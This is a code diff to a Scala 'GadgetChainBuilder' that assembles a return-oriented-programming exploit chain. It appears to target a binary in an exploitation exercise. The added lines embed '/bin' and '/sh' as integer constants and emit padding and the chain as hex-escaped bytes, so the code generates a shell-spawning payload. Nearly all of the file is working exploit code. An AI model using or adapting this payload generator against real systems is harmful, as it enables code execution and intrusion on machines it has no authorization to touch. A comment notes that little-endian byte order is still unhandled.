@@ -16,25 +16,31 @@ object GadgetChainBuilder {
       i += 1;
     }
 
-    chain(0) = addresses(1)
-    chain(1) = addresses(2)
-    chain(2) = 185273099
-    chain(3) = addresses(0) + 28
-    chain(4) = addresses(3)
-    chain(5) = addresses(4)
-    chain(6) = addresses(5)
-    chain(7) = addresses(0) + 56
-    chain(8) = addresses(6)
-    chain(9) = addresses(0) + 48
-    chain(10) = addresses(0) + 52
-    chain(11) = addresses(7)
-    chain(12) = addresses(0) + 56
-    chain(13) = 0
-    chain(14) = 1852400175
-    chain(15) = 6845231
+    chain(0) = addresses(1)       // 0
+    chain(1) = addresses(2)       // 4
+    chain(2) = 185273099          // 8
+    chain(3) = addresses(0) + 28  // 12
+    chain(4) = addresses(3)       // 16
+    chain(5) = addresses(4)       // 20
+    chain(6) = addresses(5)       // 24
+    chain(7) = addresses(0) + 56  // 28
+    chain(8) = addresses(6)       // 32
+    chain(9) = addresses(0) + 48  // 36
+    chain(10) = addresses(0) + 52 // 40
+    chain(11) = addresses(7)      // 44
+    chain(12) = addresses(0) + 56 // 48
+    chain(13) = addresses(0) + 63 // 52 Points at 0 in /sh/0
+    chain(14) = 794978670         // 56 "/bin"
+    chain(15) = 796092416         // 60 "/sh/0"
+
+    for (i <- 0 until 8)
+      print(s"\\x42")
 
     for (gadget <- chain) {
-      println(gadget.toHexString)
+      val hex = String.format("%08x", gadget)
+
+      for (i <- 0 until (hex.length, 2)) // todo: deal with little endianness
+        print(s"\\x${hex(i)}${hex(i + 1)}")
     }
   }
 }
